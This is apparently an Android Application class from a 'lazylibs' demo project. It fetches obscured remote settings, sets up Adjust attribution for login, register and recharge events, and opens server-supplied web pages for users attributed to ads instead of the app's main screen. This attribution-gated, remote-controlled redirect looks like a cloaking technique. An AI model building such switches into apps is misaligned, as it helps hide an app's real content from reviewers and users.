package com.lazylibs.demo;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;

import com.adjust.sdk.Adjust;
import com.alibaba.fastjson.JSON;
import com.lazylibs.adsenter.Enter;
import com.lazylibs.adsenter.Patos;
import com.lazylibs.adser.Adser;
import com.lazylibs.adser.adjust.AdjustChannel;
import com.lazylibs.adser.adjust.IAdjustConfig;
import com.lazylibs.adser.base.IAdsChannel;
import com.lazylibs.adser.base.IAdsConfig;
import com.lazylibs.adser.base.IAdsEvent;
import com.lazylibs.http.SimpleOkHttp;
import com.lazylibs.utils.Lazier;
import com.lazylibs.utils.Logger;
import com.lazylibs.utils.Xc;
import com.lazylibs.utils.cache.Cache;
import com.lazylibs.utils.cache.sp.ISpCache;
import com.lazylibs.weber.LazyWebActivity;

import java.util.HashMap;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;

public class App extends Application {


    /***
     * 配置读取地址
     */
    private String u = Lazier.uRaw("https://i.v2o.top/api/v1/gadsts/7", Xc.ck);
    /***
     * 配置解析结果
     */
    private As appSettings = null;

    private void initAppSettings(String settings) {
        Logger.d("App.initAs()" + settings);
        if (!TextUtils.isEmpty(settings)) {
            try {
                appSettings = JSON.parseObject(settings, As.class);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    protected <C extends IAdsConfig, E extends IAdsEvent> IAdsChannel<C, E> getAdsChannel() {
        IAdjustConfig adsConfig = null;
        if (appSettings != null) {
            adsConfig = appSettings.ac();
        }
        return (IAdsChannel<C, E>) new AdjustChannel(adsConfig == null ? new IAdjustConfig.Simple("bn2v0eblh3wg", "BRL", "FB_LOGIN pq6vxp FB_REGISTER mqo3x3 FIRST_RECHARGE ukxnjq GOOGLE_LOGIN rpp974 GOOGLE_REGISTER cdtbe3 LOGIN 7ikzr6 PAGE_VIEW 2kwnrd PAY_RECHARGE czh08m REGISTER 2mhnq8 SECOND_RECHARGE 2b8ktc") : adsConfig);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        registerActivityLifecycleCallbacks(new Application.ActivityLifecycleCallbacks() {
            @Override
            public void onActivityCreated(Activity activity, Bundle savedInstanceState) {

            }

            @Override
            public void onActivityStarted(Activity activity) {

            }

            @Override
            public void onActivityResumed(Activity activity) {
                Log.d("Lzlbs", "onActivityResumed " + activity.getComponentName());
            }

            @Override
            public void onActivityPaused(Activity activity) {
                Log.d("Lzlbs", "onActivityPaused " + activity.getComponentName());
            }

            @Override
            public void onActivityStopped(Activity activity) {

            }

            @Override
            public void onActivitySaveInstanceState(Activity activity, Bundle outState) {

            }

            @Override
            public void onActivityDestroyed(Activity activity) {

            }
        });
        Lazier.onCreate(this);
        Logger.d("App.onCreate()");
        Cache.onCreate(new ISpCache.Factory() {
            @Override
            public Context requireContext() {
                return App.this;
            }
        });
        initAppSettings(Cache.get("sts", ""));
//        if (appSettings != null) {
        Adser.onCreate(App.this, getAdsChannel());
//        }
//        else {
//            Handler handler = new Handler(Looper.getMainLooper());
//            handler.postDelayed(() -> Adser.onCreate(App.this, getAdsChannel()), 2000);
//        }
        Enter.onCreate(new Enter.ISkipper() {


            @Override
            public void afterEnter(Activity activity, boolean agreePatos) {
                Logger.d("Enter.ISkipper.afterEnter " + agreePatos);
                if (agreePatos) {
                    skipPatos(activity);
                } else {
                    showPatos(activity);
                }
            }

            @Override
            public void adsed(Activity activity, boolean isAdser) {
                Logger.d("App.onCreate.adsed " + isAdser);
                if (appSettings != null) {
                    if (isAdser) {
                        Logger.d("App.onCreate.adsed 1 " + isAdser + appSettings.zb());
                        LazyWebActivity.start(activity.getApplicationContext(), appSettings.zb());
                    } else {
                        if (!TextUtils.isEmpty(appSettings.za())) {
                            Logger.d("App.onCreate.adsed 2 " + isAdser + appSettings.za());
                            LazyWebActivity.start(activity.getApplicationContext(), appSettings.za());
                        } else {
                            Logger.d("App.onCreate.adsed 3 " + isAdser);
                            activity.startActivity(new Intent(activity.getApplicationContext(), MainActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                        }
                    }
                    activity.finish();
                }
            }

            @Override
            public void showPatos(Activity activity) {
                Logger.d("App.onCreate.showPatos ");
                startActivity(new Intent(activity, Patos.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                activity.finish();
            }

            @Override
            public String getPatos() {
                return appSettings != null ? appSettings.zp() : "PATOS!";//"必须同意，不同意不给玩哦";//"必须同意，不同意不给玩哦";//"https://bing.com";
            }
        });
        SimpleOkHttp simpleOkHttp = new SimpleOkHttp() {
            @Override
            public void onSuccess(String data) {
                super.onSuccess(data);
                Logger.d("App.simpleOkHttp.onSuccess" + data);
                try {
                    Cache.put("sts", data);
                    initAppSettings(data);
                    if (!Adser.isInitialized() && appSettings != null) {
                        Handler handler = new Handler(Looper.getMainLooper());
                        handler.post(() -> Adser.onCreate(App.this, getAdsChannel()));
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

//            @Override
//            public OkHttpClient.Builder getHttpBuilder() {
//                return super.getHttpBuilder().connectTimeout(5, TimeUnit.SECONDS).callTimeout(5, TimeUnit.SECONDS).readTimeout(5, TimeUnit.SECONDS).writeTimeout(5, TimeUnit.SECONDS);
//            }
        };
        if (!TextUtils.isEmpty(u)) {
            Logger.d("App.onCreate.getRetry : " + u);
            simpleOkHttp.getRetry(u);
        }
    }

    @Override
    public void onTerminate() {
        super.onTerminate();
        Adser.onTerminate(this);
        Enter.onTerminate();
        Cache.onTerminate();
        Lazier.onTerminate();
    }
}
